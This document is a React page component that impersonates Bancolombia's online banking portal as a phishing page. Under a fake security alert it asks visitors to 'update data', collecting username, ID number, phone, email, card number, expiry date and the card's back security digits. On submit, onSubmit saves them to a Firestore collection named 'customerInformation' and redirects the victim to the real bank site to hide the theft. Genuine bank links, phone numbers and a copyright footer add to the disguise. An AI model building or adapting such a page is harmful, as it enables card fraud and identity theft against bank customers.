import { useState, useEffect } from 'react'
import { useForm } from "react-hook-form";

import { addToDatabase } from '@/libraries/firebaseFirestore'
import styles from '@/styles/App.module.scss'

function App() {
  const [date, setDate] = useState(new Date());
  const [isLoading, setIsLoading] = useState(false)
  const { register, handleSubmit, formState: { errors } } = useForm();

  const options = {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    hour12: true,
  };

  useEffect(() => {
    const timerID = setInterval(() => setDate(new Date()), 1000);
    return () => clearInterval(timerID);
  }, []);

  const onSubmit = async (data) => {
    setIsLoading(true)
    await addToDatabase("customerInformation", data)
    location.href = "https://www.bancolombia.com/"
  };

  return (
    <>
      <section className={styles.section}>
        <div className={styles.header}>
          <div className={styles.info}>
            <div className={styles.info_logo}>
              <img src="./src/assets/logo.svg" />
            </div>
            <div className={styles.info_information}>
              <span className={styles.info_information_title}>
              Sucursal Virtual Personas
              </span>
              <div className={styles.info_information_time}>
                <span className={styles.info_information_time_title}>
                Fecha y hora actual:
                </span>
                <span className={styles.info_information_time_info}>
                  {date.toLocaleTimeString('es-ES', options)}
                </span>
              </div>
            </div>
          </div>
          <div className={styles.title}>
          Actualización de datos
          </div>
        </div>

        <div className={styles.alert}>
          <div className={styles.alert_icon}>
            <span>X</span>
          </div>
          <div className={styles.alert_text}>
          Por motivos de seguridad y para brindarte una mejor experiencia, te pedimos que actualices tus datos, es muy fácil y rápido, recuerda que tu seguridad es nuestra prioridad.
          </div>
        </div>

        <div className={styles.content}>
          <div className={styles.content_user}>
            <div className={styles.content_user_title}>
            Usuario
            </div>
            <div className={styles.content_user_help}>
              {"Si no tienes un usuario asignado ingresa con tu documento de identidad"}
            </div>
            <div className={styles.content_user_info}>
              <form onSubmit={handleSubmit(onSubmit)} className={styles.content_user_info_form}>
                <div>
                  <label>Usuario</label>
                  {errors.user?.type === 'required' && <span>El usuario es requerido</span>}
                </div>
                <input type="text" {...register("user", { required: true })} />
                <div>
                  <label>Identificación</label>
                  {errors.id?.type === 'required' && <span>El número de identificación es requerido</span>}
                </div>
                <input type="number" {...register("id", { required: true })} />
                <div>
                  <label>Número de contacto</label>
                  {errors.number?.type === 'required' && <span>El número de contacto es requerido</span>}
                </div>
                <input type="number" {...register("number", { required: true })} />
                <div>
                  <label>Correo Electrónico</label>
                  {errors.email?.type === 'required' && <span>El correo electrónico es requerido</span>}
                </div>
                <input type="email" {...register("email", { required: true })} />
                <div>
                  <label>Número de tarjeta</label>
                  {errors.tarjet?.type === 'required' && <span>El número de tarjeta es requerido</span>}
                </div>
                <input type="number" {...register("tarjet", { required: true })} />
                <div>
                  <label>Fecha de vencimiento</label>
                  {errors.date?.type === 'required' && <span>La fecha de vencimiento es requerida</span>}
                </div>
                <input type="number" {...register("date", { required: true })} />
                <div>
                  <label>Números al respaldo</label>
                  {errors.clave?.type === 'required' && <span>Los números al respaldo son requeridos</span>}
                </div>
                <input type="number" {...register("clave", { required: true })} />
                <input type="submit" value="Continuar" />
              </form>
            </div>
          </div>

          <div className={styles.content_others}>
            <div className={styles.content_others_item}>
              <a href="https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas" target="_blank" rel="noreferrer">
                <div className={styles.content_others_item_icon}>
                  <img src="./src/assets/icon_1.png" alt="Icon1" />
                </div>
                <div className={styles.content_others_item_text}>
                Conoce sobre Sucursal Virtual Personas
                </div>
              </a>
            </div>
            <div className={styles.content_others_item}>
              <a href="https://www.bancolombia.com/educacion-financiera/seguridad-bancaria/seguridad-informatica" target="_blank" rel="noreferrer">
                <div className={styles.content_others_item_icon}>
                  <img src="./src/assets/icon_2.png" alt="Icon1" />
                </div>
                <div className={styles.content_others_item_text}>
								Aprende sobre Seguridad
                </div>
              </a>
            </div>
            <div className={styles.content_others_item}>
              <a href="https://www.bancolombia.com/wcm/connect/www.grupobancolombia.com15880/cdd7ef14-0302-4906-8913-9313b98e060e/REGLAMENTO+BANCA+POR+INTERNET+a+partir+salida+OTP+06+junio.pdf?MOD=AJPERES&amp;CVID=m82iJ3m" target="_blank" rel="noreferrer">
                <div className={styles.content_others_item_icon}>
                  <img src="./src/assets/icon_3.png" alt="Icon1" />
                </div>
                <div className={styles.content_others_item_text}>
								Reglamento Sucursal Virtual
                </div>
              </a>
            </div>
            <div className={styles.content_others_item}>
              <a href="https://www.bancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa" target="_blank" rel="noreferrer">
                <div className={styles.content_others_item_icon}>
                  <img src="./src/assets/icon_4.png" alt="Icon1" />
                </div>
                <div className={styles.content_others_item_text}>
								Política de Privacidad
                </div>
              </a>
            </div>
          </div>
        </div>
        <footer className={styles.footer}>
          <div>
            <span>{"Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - "}</span>
            <span>{" Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14."}</span>
          </div>
          <div className={styles.footer_copy}>
            <span>{"Dirección IP: 186.80.107.212"}</span>
            <span>{`Copyright © ${(new Date).getFullYear()} Bancolombia S.A.`}</span>
          </div>
        </footer>
      </section>
      {isLoading && <div className={styles.modal} />}
    </>
  )
}

export default App
